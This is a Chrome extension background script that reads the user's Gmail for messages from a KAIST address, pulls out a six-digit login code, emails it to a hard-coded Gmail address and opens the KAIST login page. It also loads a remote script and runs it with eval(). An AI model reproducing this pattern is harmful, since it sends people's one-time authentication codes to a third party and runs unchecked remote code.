chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === 'checkEmail') {
    checkEmail();
  }
});

function checkEmail() {
  chrome.identity.getAuthToken({ interactive: true }, function(token) {
    if (chrome.runtime.lastError) {
      console.error(chrome.runtime.lastError);
      return;
    }

    window.gapi_onload = () => authorize(token);
    loadScript('https://apis.google.com/js/client.js');
  });
}

function loadScript(url) {
  var request = new XMLHttpRequest();
  request.onreadystatechange = function() {
    if (request.readyState !== 4) return;
    if (request.status !== 200) return;
    eval(request.responseText);
  };
  request.open('GET', url);
  request.send();
}

function authorize(token) {
  gapi.auth.setToken({ access_token: token });
  gapi.client.load('gmail', 'v1', gmailAPILoaded);
}

function gmailAPILoaded() {
  let startTime = Date.now();
  const checkInterval = 5000; // 5 seconds
  const maxDuration = 60000; // 1 minute

  function checkInbox() {
    getThreads('from:iamp.kaist.ac.kr', ['INBOX']).then(response => {
      if (response.result.threads && response.result.threads.length > 0) {
        getThreadDetails(response.result.threads).then(batchResponse => {
          batchResponse.result.forEach(thread => {
            const message = thread.result.messages[0];
            const code = extractCodeFromMessage(message);
            if (code) {
              sendEmailWithCode(code);
              chrome.tabs.create({ url: 'https://klms.kaist.ac.kr/login/ssologin.php' });
            }
          });
        }).catch(error => {
          console.error('Error getting thread details:', error);
        });
      } else if (Date.now() - startTime < maxDuration) {
        setTimeout(checkInbox, checkInterval);
      }
    }).catch(error => {
      console.error('Error checking email:', error);
    });
  }

  checkInbox();
}

/* Utility functions for Gmail API requests */
function getThreads(query, labels) {
  return gapi.client.gmail.users.threads.list({
    userId: 'me',
    q: query, // optional query
    labelIds: labels // optional labels
  }); // returns a promise
}

function getThreadDetails(threads) {
  var batch = gapi.client.newBatch();
  for (var ii = 0; ii < threads.length; ii++) {
    batch.add(gapi.client.gmail.users.threads.get({
      userId: 'me',
      id: threads[ii].id
    }));
  }
  return batch;
}

function extractCodeFromMessage(message) {
  const bodyParts = message.payload.parts.filter(part => part.mimeType === 'text/plain');
  if (bodyParts.length > 0) {
    const body = bodyParts[0].body.data;
    const decodedBody = atob(body.replace(/-/g, '+').replace(/_/g, '/'));
    const codeMatch = decodedBody.match(/\b\d{6}\b/);
    return codeMatch ? codeMatch[0] : null;
  }
  return null;
}

function sendEmailWithCode(code) {
  const email = [
    'To: seohyun8646@gmail.com',
    'Subject: 6-digit code',
    '',
    `Your 6-digit code is: ${code}`
  ].join('\r\n');

  const base64EncodedEmail = btoa(unescape(encodeURIComponent(email))).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');

  gapi.client.gmail.users.messages.send({
    userId: 'me',
    resource: {
      raw: base64EncodedEmail
    }
  }).then(() => {
    console.log('Email sent successfully!');
  }).catch(error => {
    console.error('Error sending email:', error);
  });
}
